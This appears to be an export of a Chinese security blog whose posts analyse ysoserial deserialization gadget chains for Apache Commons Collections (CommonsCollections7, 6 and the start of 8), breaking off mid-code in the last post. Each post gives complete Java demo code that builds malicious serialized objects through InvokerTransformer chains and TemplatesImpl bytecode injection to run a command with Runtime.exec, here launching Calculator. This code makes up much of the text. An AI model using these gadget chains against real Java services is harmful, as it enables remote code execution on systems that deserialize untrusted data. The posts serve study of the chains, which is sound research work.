<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazymap2.put(<span class="string">"zZ"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazymap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        lazymap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:</p>
<p><img src="7.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/12427015.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(7)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections6</title>
    <url>/2020/04/27/ysoserial-analyze-6/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections6。CommonsCollections6主要是利用<font color=#008000><code>Hashset</code></font>触发readObject函数，然后利用LazyMap.get函数触发transform函数。</p>
<a id="more"></a>

<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a>  </p>
<p>CommonsCollections6与CommonsCollections5相比，最外层使用的是新的类<code>HashSet</code>，即从HashSet触发其readObject()一直到触发TiedMapEntry.getValue()。整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">  -&gt;HashMap.put()</span><br><span class="line">    -&gt;HashMap.hash()</span><br><span class="line">      -&gt;TiedMapEntry.hashCode()</span><br><span class="line">        -&gt;TiedMapEntry.getValue()</span><br><span class="line">          -&gt;LazyMap.get()</span><br><span class="line">            -&gt;ChainedTransformer.transform()</span><br><span class="line">              -&gt;ConstantTransformer.transform()</span><br><span class="line">              -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>从整个利用链可以得知，从TiedMapEntry.getValue开始到结束与前面的CommonsCollections5一样，在这里就不再分析它了。</p>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在前面提到过TiedMapEntry类触发其getValue函数有toString、hashCode以及equals。CommonsCollections5利用的就是toString，而此次我们要分析的是<code>hashCode</code>。</p>
<p>那么首先，我们需要找到一个类，1)可序列化;2)它的方法中调用了Object.hashCode或者调用了TiedMapEntry.hashCode或者是Entry.hashCode。</p>
<p>由于hashCode的存在主要是用于查找的快捷性，容易出现在HashTable、HashMap等。在这里定位到HashMap类中，发现其有一个hash()方法。发现其调用了key.hashCode，且key是一个Object类。</p>
<p><img src="1.png" alt=""></p>
<p>那么接下来就需要找调用这个hash函数的地方，通过搜索调用hash函数的有putMapEntries、get、containsKey、put、remove等。CommonsCollections6选择了put函数。</p>
<p><img src="2.png" alt=""></p>
<p>其实类中的add方法页调用了map.put方法。那么接下来就转变为寻找一个类，满足1）可序列化；2）方法中调用了HashMap的put方法、Object的put方法或Map的put方法。</p>
<p>这里我们定位到HashSet的readObject方法。</p>
<p><img src="3.png" alt=""></p>
<p>可以看到在其readObject函数中，创建了一个Map，且在后续调用了map.put。到此为止整个利用链就分析完了。接下来构造payload。</p>
<h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>分析payload的构造，也从TiedMapEntry.hashCode开始分析。在这里和之前一样，只需要保持TiedMapEntry的this.map是LazyMap对象即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">               new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">       Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">       TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>然后就是调用TiedMapEntry.hashCode的HashMap.hash方法。<code>hash(Object key)</code>调用了key.hashCode()。所以传入的参数key需要为上面构造好的TiedMapEntry对象。继续追溯这个key的来源。put方法中接收key这个参数来调用hash(key)。继续往上，就是hashSet中的<code>map.put(e,PRESENT)</code>。因此，e必须为TiedMapEntry对象。因此e是一个序列化后的TiedMapEntry对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br></pre></td></tr></table></figure>

<p><img src="4.png" alt=""></p>
<p>实例化后的HashSet会将map属性实例化为一个空的HashMap对象。HashSet的add方法能够往这个map属性中加入元素。add方法本质上也是调用map.put(e,PRESENT)。<code>add(&quot;foo&quot;)</code>的作用就是map.put(“Foo”,PRESENT)。</p>
<p><img src="5.png" alt=""></p>
<p>再调用<code>map.add(&quot;foo&quot;)</code>之后，整个过程是HashMap的存储过程。实际上就是HashMap新建了一个Node节点，节点的key为”foo”。因此，我们要做的就是获取到这个建立的节点，将其key更改为TiedMapEntry对象。</p>
<p>首先获取HashSet的map属性,其属性是个HashMap。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field d =<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span>(NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析HashMap的存储过程可以知道，Node节点是存储在HashMAp的table属性中的。接着获取HashMap中的table属性，然后通过反射拿到节点数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">        node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到节点数组之后就是获取节点的key属性，将其赋值为TeidMapEntry对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyField.set(node,tiedMapEntry);</span><br></pre></td></tr></table></figure>


<p>整个payload的构造就到这里结束了。完整的demo如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span>(NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//返回map对象上此Field表示的字段的值</span></span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(map);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下所示:</p>
<p><img src="6.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/12421157.html" target="_blank" rel="noopener">Java反序列化-ysoserial-调试分析总结篇(6)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections8</title>
    <url>/2020/04/28/ysoserial-analyze-8/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections8。它是2019年<code>navalorenzo</code>推动到ysoserial上的。CommonsCollections8利用的是commonscollections:4.0版本。这条利用链与CommonsCollections2，4比较相似，不同的是适用了新的readObject触发点<font color=#008000><code>TreeBag</code></font>。</p>
<a id="more"></a>

<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a> </p>
<p>CommonsCollections8使用新的readObject触发点<code>TreeBag</code>。与CommonsCollections2，4一样，都是利用了TemplatesImpl来执行任意命令，TransformingCoparator.compare()来触发transform函数。</p>
<p>它整个的利用链如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TreeBag.readObject()</span><br><span class="line">  -&gt;AbstractMapBag.doReadObject()</span><br><span class="line">    -&gt;TreeMap.put()</span><br><span class="line">      -&gt;TreeMap.compare()</span><br><span class="line">        -&gt;TransformingComparator.compare()</span><br><span class="line">          -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先看一下<code>TreeBag</code>这个类的readObject函数。</p>
<p><img src="1.png" alt=""></p>
<p>前面的都是正常的反序列化，这里关注<code>super.doReadObject()</code>。然后跟进它。</p>
<p><img src="2.png" alt=""></p>
<p>根据前面可知，传入的map为TreeMap类型，在doReadObject()函数调用了<code>TreeMap.put()</code>，跟进它。</p>
<p><img src="3.png" alt=""></p>
<p>当comparator不为空时，调用了<code>comparator.compare()函数</code>，根据之前的分析，这里使得comparator为TransformingComparator就可以了，剩下的与CommonsCollections2相同，就不分析了。</p>
<p><img src="4.png" alt=""></p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>首先是从TransformingComparator至执行命令后半部分。这在之前已经分析过，直接放出代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">        command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">        <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,<span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line">Field field0 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field0.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">Field field1 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(templates, TransformerFactory<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>

<p>然后就是上述分析的TreeMap的comparator属性为构造好的TransformingComparator对象。例如下列这句代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeMap treemap = <span class="keyword">new</span> TreeMap(transformingcomparator);</span><br></pre></td></tr></table></figure>

<p>事实上，在TreeBag的readObject中，会进行TreeMap的实例化，只需要</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeBag treeBag = <span class="keyword">new</span> TreeBag(transformingComparator);</span><br><span class="line">treeBag.add(templates);</span><br></pre></td></tr></table></figure>

<p>然后再将transformer的iMethodName改为newTransformer即可。</p>
<p>完整的demo如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field0 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field0.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">        Field field1 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field1.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span 